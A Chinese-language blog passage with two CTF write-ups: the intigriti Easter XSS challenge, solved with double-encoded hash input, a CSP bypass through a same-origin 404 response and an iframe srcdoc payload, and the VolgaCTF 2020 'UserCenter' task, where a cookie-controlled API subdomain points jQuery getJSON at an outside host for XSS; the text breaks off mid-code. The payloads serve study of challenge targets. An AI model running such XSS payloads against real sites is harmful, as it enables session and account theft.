<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>国外的一个xss challenge(规定时间内做出可得一年的Burp Suite正版证书)</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JY7U10.png" alt="JY7U10.png"></p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>主要的功能逻辑代码为script.js, 如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hash = <span class="built_in">document</span>.location.hash.substr(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(hash)&#123;</span><br><span class="line">  displayReason(hash);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"reasons"</span>).onchange = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(e.target.value != <span class="string">""</span>)</span><br><span class="line">    displayReason(e.target.value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reasonLoaded</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> reason = <span class="built_in">document</span>.getElementById(<span class="string">"reason"</span>);</span><br><span class="line">    reason.innerHTML = <span class="built_in">unescape</span>(<span class="keyword">this</span>.responseText);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">displayReason</span>(<span class="params">reason</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.location.hash = reason;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.addEventListener(<span class="string">"load"</span>, reasonLoaded);</span><br><span class="line">  xhr.open(<span class="string">"GET"</span>,<span class="string">`./reasons/<span class="subst">$&#123;reason&#125;</span>.txt`</span>);</span><br><span class="line">  xhr.send();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码逻辑为：</p>
<p>通过触发location.hash的变化来调用displayReason函数，通过ajax请求得到./reasons/${reason}.txt，然后把response的内容返回给id为reason的标签。</p>
<p>首先测试了下直接在URL的锚部分写上xss语句</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtR4Zn.png" alt="JtR4Zn.png"></p>
<p>这里可以看到这个404的页面，在response时不仅对特殊字符进行了编码处理，而且还会将%替换为_，所以直接通过xss语句触发是没戏了。</p>
<p>接下来尝试了一下.htaccess等403页面的触发，看下对应的response内容有没有经过处理</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtfOER.png" alt="JtfOER.png"></p>
<p>可以看到，在403的response中我们的xss语句是完整存在的，那么接下来只需要把这个xss带到我们之前的页面就可以触发xss了</p>
<p>进行尝试</p>
<p>这里需要注意两个地方</p>
<ul>
<li>第一个是默认ajax去请求是下reasons文件夹下，我们如果要请求.htaccess是需要向上跳一级目录的</li>
<li>第二个是我们需要拿到的是访问htaccess得到的response，所以htaccess的参数需要进行二次编码</li>
</ul>
<p>最终访问效果如下：</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtIBZQ.png" alt="JtIBZQ.png"></p>
<p>可以看到img标签成功被解析。</p>
<p>不过此时仍然没法弹窗，因为这个challenge是有csp进行限制的,csp规则如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &#39;self&#39;;</span><br></pre></td></tr></table></figure>

<p>限制了资源必须来自此站点</p>
<p>那么接下来就开始寻找一些可以当成js来执行的地方，我们可以通过之前的404页面返回的内容来当作我们的js语句，并且通过script标签的src属性进行引入，唯一需要注意的是要进行单引号的闭合</p>
<p>构造语句如下：</p>
<p><a href="https://imgchr.com/i/JtbPAg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/22/JtbPAg.png" alt="JtbPAg.png"></a></p>
<p>在控制台执行一下</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtbQN4.png" alt="JtbQN4.png"></p>
<p>成功触发，接下来把这个返回内容作为外部js引入就可以了</p>
<p>不过不能直接在response里面直接返回script标签，因为这里的赋值是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reason.innerHTML &#x3D; unescape(this.responseText);</span><br></pre></td></tr></table></figure>

<p>通过innterHTML产生的script标签并不可以执行</p>
<p>所以这里可以用iframe的srcdoc属性去解决这个问题，payload如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">srcdoc</span>=<span class="string">'&lt;script src="x%27-alert(document.domain)-%27"&gt;&lt;/script&gt;'</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将上面的payload二次编码后，放进location.hash</p>
<p>成功触发xss</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtvIGF.png" alt="JtvIGF.png"></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2020/05/12/intigriti-Easter-XSS-challenge/" data-id="ckabsu38w002tkkvr8c5icon6" class="article-share-link" data-share="baidu" data-title="intigriti Easter XSS challenge">Share</a>
      

      
        <a href="http://yoursite.com/2020/05/12/intigriti-Easter-XSS-challenge/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-VolgaCTF-2020-Qualifier-Web" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/22/VolgaCTF-2020-Qualifier-Web/" class="article-date">
  <time datetime="2020-04-22T09:35:57.000Z" itemprop="datePublished">2020-04-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/22/VolgaCTF-2020-Qualifier-Web/">VolgaCTF 2020 Qualifier-Web</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="UserCenter"><a href="#UserCenter" class="headerlink" title="UserCenter"></a>UserCenter</h3><p>首先大概一下浏览基本功能</p>
<ul>
<li>登陆/注册</li>
<li>查看个人信息以及修改个人信息和头像</li>
<li>Report Bug将URL发送给admin进行xss</li>
</ul>
<p>大概测试了一下，发现如下：</p>
<p>修改个人信息的地方会进行html实体编码没法xss，头像处试过传了下svg，发现不太行，网站对type做了限制，限制了svg以及xml等文件的上传，并且它是把网站上传的图片放到static子域进行储存的。</p>
<p>不过发现我们可以通过控制type的类型来控制返回文件的类型. 我是通过<code>text/plain;,text/html</code>来进行bypass的，因为在Chrome中是支持以逗号分隔的多种内容类型的，所以可以利用这个来进行Bypass.</p>
<p><img src="https://s1.ax1x.com/2020/03/31/GQfQCF.png" alt="GQfQCF.png"></p>
<p>看了下国外大哥的wp,发现他fuzz出了更多可执行xss的Content-Type, tql..</p>
<p>详细可以看这篇文章</p>
<p><a href="https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html" target="_blank" rel="noopener">https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html</a></p>
<p>接下来可以看下主页面的main.js..(我刚开始没发现这个文件..)</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params">guid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (guid) &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user?guid=<span class="subst">$&#123;guid&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">            data</span></span></span><br><span class="line"><span class="function"><span class="params">        </span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/profile.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user`</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/login.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">jqxhr, textStatus, error</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(jqxhr, textStatus, error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user-update`</span>,</span><br><span class="line">        data: <span class="built_in">JSON</span>.stringify(user),</span><br><span class="line">        contentType: <span class="string">"application/json"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span></span><br><span class="line">    &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">            showError(data.error);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            location.replace(<span class="string">`/profile.html`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.<span class="keyword">get</span>(`//$&#123;api&#125;.volgactf-task.ru/logout<span class="string">`, function(data) &#123;</span></span><br><span class="line"><span class="string">        location.replace("/login.html");</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function profile(user, edit) &#123;</span></span><br><span class="line"><span class="string">    if (</span></span><br><span class="line"><span class="string">        !["/profile.html", "/report.php", "/editprofile.html"].includes(</span></span><br><span class="line"><span class="string">            location.pathname</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">        location.replace("/profile.html");</span></span><br><span class="line"><span class="string">    $("#username").text(user.username);</span></span><br><span class="line"><span class="string">    $("#username").val(user.username);</span></span><br><span class="line"><span class="string">    $("#bio").text(user.bio);</span></span><br><span class="line"><span class="string">    $("#bio").val(user.bio);</span></span><br><span class="line"><span class="string">    $("#avatar").attr("src", `</span><span class="comment">//static.volgactf-task.ru/$&#123;user.avatar&#125;`);</span></span><br><span class="line">    <span class="keyword">if</span> (edit) &#123;</span><br><span class="line">        $(<span class="string">"#editProfile"</span>).removeClass(<span class="string">"d-none"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/login.html"]'</span>).addClass(<span class="string">"d-none"</span>);</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/register.html"]'</span>).addClass(<span class="string">"d-none"</span>);</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/profile.html"]'</span>).removeClass(<span class="string">"d-none"</span>);</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/logout.html"]'</span>).removeClass(<span class="string">"d-none"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceForbiden</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line">        .replace(<span class="regexp">/[ !"#$%&amp;Вґ()*+,\-\/:;&lt;=&gt;?@\[\\\]^_`&#123;|&#125;~]/g</span>, <span class="string">""</span>)</span><br><span class="line">        .replace(<span class="regexp">/[^\x00-\x7F]/g</span>, <span class="string">"?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showError</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">    $(<span class="string">"#error"</span>)</span><br><span class="line">        .removeClass(<span class="string">"d-none"</span>)</span><br><span class="line">        .text(error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    api = <span class="string">"api"</span>;</span><br><span class="line">    <span class="keyword">if</span> (Cookies.get(<span class="string">"api_server"</span>)) &#123;</span><br><span class="line">        api = replaceForbiden(Cookies.get(<span class="string">"api_server"</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Cookies.set(<span class="string">"api_server"</span>, api, &#123; <span class="attr">secure</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $.ajaxSetup(&#123;</span><br><span class="line">        xhrFields: &#123;</span><br><span class="line">            withCredentials: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#logForm"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">"POST"</span>,</span><br><span class="line">            url: <span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/login`</span>,</span><br><span class="line">            data: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">                username: $(<span class="string">"#username"</span>).val(),</span><br><span class="line">                password: $(<span class="string">"#password"</span>).val()</span><br><span class="line">            &#125;),</span><br><span class="line">            contentType: <span class="string">"application/json"</span>,</span><br><span class="line">            dataType: <span class="string">"json"</span></span><br><span class="line">        &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                showError(data.error);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                location.replace(<span class="string">`/profile.html?guid=<span class="subst">$&#123;data.guid&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#regForm"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">"POST"</span>,</span><br><span class="line">            url: <span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/register`</span>,</span><br><span class="line">            data: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">                username: $(<span class="string">"#username"</span>).val(),</span><br><span class="line">                password: $(<span class="string">"#password"</span>).val()</span><br><span class="line">            &#125;),</span><br><span class="line">            contentType: <span class="string">"application/json"</span>,</span><br><span class="line">            dataType: <span class="string">"json"</span></span><br><span class="line">        &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                showError(data.error);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                location.replace(<span class="string">`/profile.html`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#avatar"</span>).on(<span class="string">"change"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="keyword">this</span>)</span><br><span class="line">            .next(<span class="string">".custom-file-label"</span>)</span><br><span class="line">            .text($(<span class="keyword">this</span>).prop(<span class="string">"files"</span>)[<span class="number">0</span>].name);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#editForm"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">        b64Avatar = <span class="string">""</span>;</span><br><span class="line">        mime = <span class="string">""</span>;</span><br><span class="line">        bio = $(<span class="string">"#bio"</span>).val();</span><br><span class="line">        avatar = $(<span class="string">"#avatar"</span>).prop(<span class="string">"files"</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (avatar) &#123;</span><br><span class="line">            reader = <span class="keyword">new</span> FileReader();</span><br><span class="line">            reader.readAsDataURL(avatar);</span><br><span class="line">            reader.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                b64Avatar = reader.result.split(<span class="string">","</span>)[<span class="number">1</span>];</span><br><span class="line">                mime = avatar.type;</span><br><span class="line">                updateUser(&#123; <span class="attr">avatar</span>: b64Avatar, <span class="attr">type</span>: mime, <span class="attr">bio</span>: bio &#125;);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            updateUser(&#123; <span class="attr">bio</span>: bio &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    params = <span class="keyword">new</span> URLSearchParams(location.search);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        [</span><br><span class="line">            <span class="string">"/"</span>,</span><br><span class="line">            <span class="string">"/index.html"</span>,</span><br><span class="line">            <span class="string">"/profile.html"</span>,</span><br><span class="line">            <span class="string">"/report.php"</span>,</span><br><span class="line">            <span class="string">"/editprofile.html"</span></span><br><span class="line">        ].includes(location.pathname)</span><br><span class="line">    ) &#123;</span><br><span class="line">        getUser(params.get(<span class="string">"guid"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ([<span class="string">"/logout.html"</span>].includes(location.pathname)) &#123;</span><br><span class="line">        logout();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>漏洞点：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    api = <span class="string">"api"</span>;</span><br><span class="line">    <span class="keyword">if</span> (Cookies.get(<span class="string">"api_server"</span>)) &#123;</span><br><span class="line">        api = replaceForbiden(Cookies.get(<span class="string">"api_server"</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Cookies.set(<span class="string">"api_server"</span>, api, &#123; <span class="attr">secure</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $.ajaxSetup(&#123;</span><br><span class="line">        xhrFields: &#123;</span><br><span class="line">            withCredentials: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> <span class="comment">//   </span></span><br><span class="line">    </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params">guid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (guid) &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user?guid=<span class="subst">$&#123;guid&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">            data</span></span></span><br><span class="line"><span class="function"><span class="params">        </span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/profile.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user`</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/login.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">jqxhr, textStatus, error</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(jqxhr, textStatus, error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在一段代码中我们可以看出来api变量的赋值时通过cookie进行的，在第二段getUser函数中子域名是通过api变量去确认的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(&#96;&#x2F;&#x2F;$&#123;api&#125;.volgactf-task.ru&#x2F;user?guid&#x3D;$&#123;guid&#125;...</span><br></pre></td></tr></table></figure>

<p>但是在可控制api变量的情况下我们实际上是可以控制请求的网址的。比如另api为exploit.lihuaiqiu.top?，那么实际请求的URL为<a href="https://exploit.lihuaiqiu.top?.volgactf-task.ru/user?guid=${guid}" target="_blank" rel="noopener">https://exploit.lihuaiqiu.top?.volgactf-task.ru/user?guid=${guid}</a> 即可控制请求的网址，但是在main.js有这样一个过滤函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function replaceForbiden(str) &#123;</span><br><span class="line">    return str</span><br><span class="line">        .replace(&#x2F;[ !&quot;#$%&amp;Вґ()*+,\-\&#x2F;:;&lt;&#x3D;&gt;?@\[\\\]^_&#96;&#123;|&#125;~]&#x2F;g, &quot;&quot;)</span><br><span class="line">        .replace(&#x2F;[^\x00-\x7F]&#x2F;g, &quot;?&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里对?进行替空 并且对\x00-\x7F换成?..所以直接用\x00-\x7F间的字符bypass一下就可以了</p>
<p>最后我们需要通过getJSON函数来触发xss.简单的看一下介绍：</p>
<p><img src="https://s1.ax1x.com/2020/03/31/GQfyDI.png" alt="GQfyDI.png"></p>
<p>本地简单试一下</p>
<p>在我们的网站放入xss语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#123;&quot;xss&quot;:alert(1)&#125;);</span><br></pre></td></tr></table></figure>

<p>调用getJSON函数，成功触发xss</p>
<p><img src="https://s1.ax1x.com/2020/03/31/GQhIJO.png" alt="GQhIJO.png"></p>
<p>所以这里我们只需要将参数控制为?即可xss，回到之前的代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user?guid=<span class="subst">$&#123;guid&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    data</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">        location.replace(<span 